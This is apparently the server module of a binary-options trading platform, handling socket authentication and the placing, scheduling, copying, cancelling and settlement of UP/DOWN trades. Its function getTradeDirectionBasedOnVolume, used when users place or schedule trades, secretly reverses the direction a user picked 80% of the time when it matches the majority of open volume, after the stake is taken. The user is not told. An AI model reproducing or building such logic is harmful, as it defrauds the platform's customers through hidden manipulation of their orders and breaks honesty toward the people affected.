const jwt = require("jsonwebtoken");
const mongoose = require("mongoose");
const AdminCopyTrade = require('./models/AdminCopyTrade');

// Global reference for marketData (populated in initialize)
let globalMarketData = {};
const POLL_INTERVAL_MS = 1000; // Check every second

// Track activation state per pair
const activationState = {};

// Track current active candle for each pair
const currentActiveCandle = {};

// --- Copy Trade Execution Logic ---
async function executeCopyTrade(io, User, Trade, copyTradeId) {
    const session = await mongoose.startSession();
    session.startTransaction();

    try {
        const copyTrade = await AdminCopyTrade.findById(copyTradeId)
            .populate('userCopies.userId')
            .session(session);

        if (!copyTrade || copyTrade.status !== 'active') {
            await session.abortTransaction();
            session.endSession();
            return;
        }

        copyTrade.status = 'executed';
        await copyTrade.save({ session });

        await session.commitTransaction();
        session.endSession();

    } catch (error) {
        await session.abortTransaction();
        session.endSession();
    }
}

// --- Auto-cleanup expired copy trades ---
async function cleanupExpiredCopyTrades(io, User, Trade) {
    try {
        const now = new Date();
        const expiredTrades = await AdminCopyTrade.find({
            status: 'active',
            executionTime: { $lte: now }
        }).lean();

        for (const copyTrade of expiredTrades) {
            try {
                await executeCopyTrade(io, User, Trade, copyTrade._id);
            } catch (innerErr) {}
        }
    } catch (error) {}
}

async function getTradeDirectionBasedOnVolume(asset, userRequestedDirection) {
    try {
        const currentVolume = await Trade.aggregate([
            { 
                $match: { 
                    asset: asset,
                    status: { $in: ["active", "pending", "scheduled"] } 
                } 
            },
            { 
                $group: { 
                    _id: '$direction',
                    totalVolume: { $sum: '$amount' }
                }
            }
        ]);

        let upVolume = 0;
        let downVolume = 0;

        currentVolume.forEach(item => {
            if (item._id === 'UP') upVolume = item.totalVolume;
            if (item._id === 'DOWN') downVolume = item.totalVolume;
        });

        const totalVolume = upVolume + downVolume;

        if (totalVolume === 0 || upVolume === downVolume) {
            return userRequestedDirection;
        }

        const dominantDirection = upVolume > downVolume ? 'UP' : 'DOWN';

        if (userRequestedDirection === dominantDirection) {
            const random = Math.random(); 
            if (random < 0.8) { 
                return dominantDirection === 'UP' ? 'DOWN' : 'UP';
            }
        }

        return userRequestedDirection;

    } catch (error) {
        return userRequestedDirection;
    }
}

// Trade monitoring logic
async function runTradeMonitor(io, User, Trade, TRADE_PAIRS) {
    const lastProcessedCompletedCandleTs = {};
    const lastCopyTradeCleanup = {};

    // Initialize activation state for each pair
    TRADE_PAIRS.forEach(pair => {
        activationState[pair] = {
            lastActivationMinute: null,
            activatedTrades: new Set()
        };
        currentActiveCandle[pair] = null;
    });

    setInterval(async () => {
        try {
            const currentMinute = Math.floor(Date.now() / 60000);

            for (const pair of TRADE_PAIRS) {
                const md = globalMarketData[pair];
                if (!md || !md.candles || md.candles.length === 0) continue;

                const pairState = activationState[pair];

                // Get the latest candle (should be the current active one)
                const latestCandle = md.candles[md.candles.length - 1];
                const latestCandleTs = new Date(latestCandle.timestamp).getTime();
                
                // Check if we have a new active candle
                if (!currentActiveCandle[pair] || currentActiveCandle[pair].timestamp !== latestCandle.timestamp) {
                    // New candle detected - update our tracking
                    currentActiveCandle[pair] = {
                        timestamp: latestCandle.timestamp,
                        open: latestCandle.open,
                        close: latestCandle.close
                    };
                    
                    // Reset activation state for new candle
                    pairState.activatedTrades.clear();
                    
                    // Activate any pending/scheduled trades for this new candle
                    const pendingTrades = await Trade.countDocuments({ 
                        status: { $in: ["pending", "scheduled"] }, 
                        asset: pair 
                    });
                    
                    if (pendingTrades > 0) {
                        await activateTradesWrapper(io, User, Trade, pair, latestCandle.open);
                    }
                }

                // 1. ACTIVATE SCHEDULED/PENDING TRADES (at the start of each new candle)
                // This is now handled above when new candle is detected

                // 2. SETTLE ACTIVE TRADES (when a candle is complete and we have a new one)
                if (md.candles.length > 1) {
                    const previousCandle = md.candles[md.candles.length - 2];
                    const previousCandleTs = new Date(previousCandle.timestamp).getTime();
                    
                    // If we haven't processed this completed candle yet
                    if (!lastProcessedCompletedCandleTs[pair] || lastProcessedCompletedCandleTs[pair] < previousCandleTs) {
                        await settleTradesWrapper(io, User, Trade, pair, previousCandle);
                        lastProcessedCompletedCandleTs[pair] = previousCandleTs;
                    }
                }
            }

            // --- Copy Trade Cleanup ---
            const now = Date.now();
            if (!lastCopyTradeCleanup.global || (now - lastCopyTradeCleanup.global) > 5000) {
                await cleanupExpiredCopyTrades(io, User, Trade);
                lastCopyTradeCleanup.global = now;
            }
        } catch (err) {
            console.error('Trade monitor error:', err);
        }
    }, POLL_INTERVAL_MS);
}

// Wrapper for Activation Logic
async function activateTradesWrapper(io, User, Trade, pair, entryPrice) {
    try {
        await activateScheduledTradesForPair(io, Trade, pair, entryPrice);
        await activatePendingTradesForPair(io, User, Trade, pair, entryPrice);
    } catch (err) {
        console.error('Activation error:', err);
    }
}

// Wrapper for Settlement Logic
async function settleTradesWrapper(io, User, Trade, pair, completedCandle) {
    try {
        await settleActiveTradesForPair(io, User, Trade, pair, completedCandle);
    } catch (err) {
        console.error('Settlement error:', err);
    }
}

async function initialize(io, User, Trade, marketData, TRADE_PAIRS) {
    globalMarketData = marketData;

    io.engine.marketData = marketData;

    io.use((socket, next) => {
        try {
            let token = socket.handshake.auth?.token;
            
            if (!token) {
                const authHeader = socket.handshake.headers.authorization;
                if (authHeader && authHeader.startsWith('Bearer ')) {
                    token = authHeader.substring(7);
                }
            }
            
            if (!token) {
                return next(new Error("Authentication error: No token"));
            }
            
            jwt.verify(token, process.env.JWT_SECRET, (err, decoded) => {
                if (err) {
                    return next(new Error("Authentication error: Invalid token"));
                }
                socket.decoded = decoded;
                next();
            });
        } catch (err) {
            return next(new Error("Authentication error"));
        }
    });

    // START THE MONITORING LOOP
    runTradeMonitor(io, User, Trade, TRADE_PAIRS);

    io.on("connection", async (socket) => {
        try {
            const userId = socket.decoded.id;
            const user = await User.findById(userId);
            if (!user) return socket.disconnect();
            socket.join(user._id.toString());

            const userTrades = await Trade.find({ userId: user._id }).sort({ timestamp: -1 }).limit(50);
            
            socket.emit("init", { 
                balance: user.balance, 
                tradeHistory: userTrades,
                marketData: globalMarketData
            });

            socket.on("trade", async (data) => {
                try {
                    const { asset, direction, amount } = data;
                    if (!TRADE_PAIRS.includes(asset)) return socket.emit("error", { message: "Invalid asset." });
                    if (!["UP", "DOWN"].includes(direction)) return socket.emit("error", { message: "Invalid direction." });

                    const existingTrade = await Trade.findOne({ 
                        userId: user._id, 
                        status: { $in: ["pending", "active", "scheduled"] } 
                    });

                    if (existingTrade) {
                        return socket.emit("error", { 
                            message: `You already have an active trade. Please wait for it to complete.` 
                        });
                    }

                    const tradeAmount = parseFloat(amount);
                    if (isNaN(tradeAmount) || tradeAmount <= 0) {
                        return socket.emit("error", { message: "Invalid trade amount." });
                    }

                    const freshUser = await User.findById(user._id);

                    if (freshUser.balance < tradeAmount) {
                        return socket.emit("error", { 
                            message: `Insufficient balance. Required: $${tradeAmount.toFixed(2)}, Available: $${freshUser.balance.toFixed(2)}` 
                        });
                    }

                    const finalDirection = await getTradeDirectionBasedOnVolume(asset, direction);

                    freshUser.balance -= tradeAmount;
                    await freshUser.save();

                    const trade = new Trade({
                        userId: user._id,
                        amount: tradeAmount,
                        direction: finalDirection, 
                        asset,
                        status: "pending", 
                        timestamp: new Date()
                    });
                    await trade.save();

                    io.to(user._id.toString()).emit("trade_pending", { trade, balance: freshUser.balance });
                } catch (err) {
                    socket.emit("error", { message: "Could not place trade." });
                }
            });

            socket.on("copy_trade", async (data) => {
                const session = await mongoose.startSession();
                session.startTransaction();

                try {
                    const { copyTradeId } = data;

                    const freshUser = await User.findById(userId).session(session);
                    if (!freshUser || freshUser.balance < 100) {
                        await session.abortTransaction();
                        session.endSession();
                        return socket.emit("error", { message: "Minimum $100 balance required to copy trades" });
                    }

                    const existingTrade = await Trade.findOne({ 
                        userId: user._id, 
                        status: { $in: ["pending", "active", "scheduled"] } 
                    }).session(session);

                    if (existingTrade) {
                        await session.abortTransaction();
                        session.endSession();
                        return socket.emit("error", { 
                            message: `You already have an active trade. Please wait for it to complete before copying.` 
                        });
                    }

                    const copyTrade = await AdminCopyTrade.findById(copyTradeId).session(session);
                    if (!copyTrade || copyTrade.status !== 'active' || copyTrade.executionTime <= new Date()) {
                        await session.abortTransaction();
                        session.endSession();
                        return socket.emit("error", { message: "This copy trade is no longer available" });
                    }

                    const alreadyCopied = copyTrade.userCopies.find(
                        copy => copy.userId.toString() === userId
                    );

                    if (alreadyCopied) {
                        await session.abortTransaction();
                        session.endSession();
                        return socket.emit("error", { message: "You have already copied this trade" });
                    }

                    const tradeAmount = (freshUser.balance * copyTrade.percentage) / 100;

                    if (freshUser.balance < tradeAmount) {
                        await session.abortTransaction();
                        session.endSession();
                        return socket.emit("error", { 
                            message: `Insufficient balance. Required: $${tradeAmount.toFixed(2)}, Available: $${freshUser.balance.toFixed(2)}` 
                        });
                    }

                    const executionTime = new Date(copyTrade.executionTime);
                    executionTime.setSeconds(0, 0); 

                    const scheduledTrade = new Trade({
                        userId: user._id,
                        amount: tradeAmount,
                        direction: copyTrade.direction === 'CALL' ? 'UP' : 'DOWN',
                        asset: copyTrade.tradingPair,
                        status: "scheduled",
                        scheduledTime: executionTime, 
                        timestamp: new Date(),
                        isCopyTrade: true,
                        originalCopyTradeId: copyTrade._id
                    });

                    freshUser.balance -= tradeAmount;

                    copyTrade.userCopies.push({
                        userId: userId,
                        copiedAt: new Date(),
                        tradeAmount: tradeAmount
                    });

                    await scheduledTrade.save({ session });
                    await copyTrade.save({ session });
                    await freshUser.save({ session });

                    await session.commitTransaction();
                    session.endSession();

                    const now = new Date();
                    const timeUntilExecution = executionTime - now;
                    const minutesUntilExecution = Math.floor(timeUntilExecution / (1000 * 60));

                    socket.emit("copy_trade_success", {
                        message: `Successfully copied trade! $${tradeAmount.toFixed(2)} scheduled to execute in ${minutesUntilExecution} minutes.`,
                        copyTrade: {
                            tradingPair: copyTrade.tradingPair,
                            direction: copyTrade.direction,
                            percentage: copyTrade.percentage,
                            executionTime: executionTime,
                            tradeAmount: tradeAmount,
                            minutesUntilExecution: minutesUntilExecution
                        },
                        scheduledTrade: scheduledTrade
                    });

                    io.to(user._id.toString()).emit("trade_scheduled", { 
                        trade: scheduledTrade, 
                        balance: freshUser.balance 
                    });

                } catch (error) {
                    await session.abortTransaction();
                    session.endSession();
                    socket.emit("error", { message: "Failed to copy trade" });
                }
            });

            socket.on("schedule_trade", async (data) => {
                try {
                    const { asset, direction, scheduledTime, amount } = data;
                    if (!TRADE_PAIRS.includes(asset)) return socket.emit("error", { message: "Invalid asset." });
                    if (!["UP", "DOWN"].includes(direction)) return socket.emit("error", { message: "Invalid direction." });

                    const existingTrade = await Trade.findOne({ 
                        userId: user._id, 
                        status: { $in: ["pending", "active", "scheduled"] } 
                    });

                    if (existingTrade) {
                        return socket.emit("error", { 
                            message: `You already have an active trade. Please wait for it to complete.` 
                        });
                    }

                    const tradeAmount = parseFloat(amount);
                    if (isNaN(tradeAmount) || tradeAmount <= 0) {
                        return socket.emit("error", { message: "Invalid trade amount." });
                    }

                    const freshUser = await User.findById(user._id);

                    if (freshUser.balance < tradeAmount) {
                        return socket.emit("error", { 
                            message: `Insufficient balance. Required: $${tradeAmount.toFixed(2)}, Available: $${freshUser.balance.toFixed(2)}` 
                        });
                    }

                    const finalDirection = await getTradeDirectionBasedOnVolume(asset, direction);

                    const serverNowUTC = new Date();
                    
                    const [hour, minute] = scheduledTime.split(":").map(Number);
                    
                    const userScheduledTimeToday = new Date(serverNowUTC);
                    userScheduledTimeToday.setUTCHours(hour, minute, 0, 0); 

                    const tenMinutesFromNow = new Date(serverNowUTC.getTime() + (10 * 60 * 1000));
                    
                    if (userScheduledTimeToday <= serverNowUTC || userScheduledTimeToday > tenMinutesFromNow) {
                        return socket.emit("error", { message: "Please select a time in the next 10 minutes." });
                    }

                    const finalScheduleDtUTC = userScheduledTimeToday; 
                    finalScheduleDtUTC.setSeconds(0, 0); 

                    freshUser.balance -= tradeAmount;
                    await freshUser.save();

                    const trade = new Trade({
                        userId: user._id,
                        amount: tradeAmount,
                        direction: finalDirection, 
                        asset,
                        status: "scheduled",
                        scheduledTime: finalScheduleDtUTC
                    });
                    await trade.save();

                    io.to(user._id.toString()).emit("trade_scheduled", { trade, balance: freshUser.balance });
                } catch (err) {
                    socket.emit("error", { message: "Could not schedule trade." });
                }
            });

            socket.on("cancel_trade", async (data) => {
                try {
                    const trade = await Trade.findOne({
                        _id: data.tradeId,
                        userId: user._id,
                        status: { $in: ["pending", "scheduled"] }
                    });
                    if (!trade) return socket.emit("error", { message: "Trade not found or cannot be cancelled." });

                    const freshUser = await User.findById(user._id);
                    freshUser.balance += trade.amount;
                    await freshUser.save();

                    trade.status = "cancelled";
                    await trade.save();
                    io.to(user._id.toString()).emit("trade_cancelled", { tradeId: trade._id, balance: freshUser.balance });
                } catch (err) {
                    socket.emit("error", { message: "Could not cancel trade." });
                }
            });

            socket.on("disconnect", () => { });
        } catch (err) {
            socket.disconnect();
        }
    });
}

// --- Helper Functions ---

async function activateScheduledTradesForPair(io, Trade, pair, entryPrice) {
    try {
        const now = new Date();
        
        const scheduleds = await Trade.find({ 
            status: "scheduled", 
            asset: pair,
            $or: [
                { scheduledTime: { $lte: now } },
                { 
                    scheduledTime: { 
                        $lte: new Date(now.getTime() + 60000),
                        $gte: new Date(now.getTime() - 60000)
                    } 
                }
            ]
        });

        for (const t of scheduleds) {
            try {
                const tradeId = t._id.toString();
                const pairState = activationState[pair];
                
                // Only activate if not already activated this candle
                if (!pairState.activatedTrades.has(tradeId)) {
                    t.status = "active";
                    t.entryPrice = entryPrice;
                    t.activationTimestamp = new Date();
                    // Store which candle this trade was activated on
                    t.activationCandleTimestamp = currentActiveCandle[pair] ? currentActiveCandle[pair].timestamp : new Date();
                    await t.save();
                    
                    pairState.activatedTrades.add(tradeId);
                    io.to(t.userId.toString()).emit("trade_active", { trade: t });
                }
            } catch (innerErr) {}
        }
    } catch (err) {}
}

async function activatePendingTradesForPair(io, User, Trade, pair, entryPrice) {
    try {
        const pendings = await Trade.find({ status: "pending", asset: pair });
        for (const t of pendings) {
            try {
                const tradeId = t._id.toString();
                const pairState = activationState[pair];
                
                // Only activate if not already activated this candle
                if (!pairState.activatedTrades.has(tradeId)) {
                    t.status = "active";
                    t.entryPrice = entryPrice;
                    t.activationTimestamp = new Date();
                    // Store which candle this trade was activated on
                    t.activationCandleTimestamp = currentActiveCandle[pair] ? currentActiveCandle[pair].timestamp : new Date();
                    await t.save();
                    
                    pairState.activatedTrades.add(tradeId);
                    io.to(t.userId.toString()).emit("trade_active", { trade: t });
                }
            } catch (innerErr) {}
        }
    } catch (err) {}
}

async function settleActiveTradesForPair(io, User, Trade, pair, completedCandle) {
    try {
        const completedCandleTs = new Date(completedCandle.timestamp).getTime();
        
        // Find all active trades for this pair
        const actives = await Trade.find({ 
            status: "active", 
            asset: pair
        });
        
        for (const t of actives) {
            try {
                const tradeActivationTs = t.activationCandleTimestamp ? new Date(t.activationCandleTimestamp).getTime() : null;
                
                // Settle trades that were activated during the completed candle
                if (tradeActivationTs === completedCandleTs) {
                    const win = (t.direction === "UP" && completedCandle.close > t.entryPrice) || 
                               (t.direction === "DOWN" && completedCandle.close < t.entryPrice);
                    const tie = completedCandle.close === t.entryPrice;
                    const pnl = tie ? 0 : (win ? t.amount * 0.9 : -t.amount);

                    t.status = "closed";
                    t.exitPrice = completedCandle.close;
                    t.result = tie ? "TIE" : (win ? "WIN" : "LOSS");
                    t.pnl = pnl;
                    t.closeTime = new Date(); 
                    await t.save();

                    const userAfter = await User.findByIdAndUpdate(
                        t.userId,
                        {
                            $inc: {
                                balance: t.amount + pnl,
                                totalTradeVolume: t.amount
                            }
                        },
                        { new: true }
                    );

                    const today = new Date();
                    today.setHours(0, 0, 0, 0);
                    const tomorrow = new Date(today);
                    tomorrow.setDate(tomorrow.getDate() + 1);

                    const todayTrades = await Trade.find({
                        userId: t.userId,
                        status: "closed",
                        closeTime: { $gte: today, $lt: tomorrow } 
                    });

                    const todayPnl = todayTrades.reduce((sum, trade) => sum + (trade.pnl || 0), 0);

                    io.to(t.userId.toString()).emit("trade_result", { 
                        trade: t, 
                        balance: userAfter.balance,
                        todayPnl: parseFloat(todayPnl.toFixed(2)) 
                    });
                }
            } catch (innerErr) {}
        }
    } catch (err) {}
}

module.exports = { initialize };
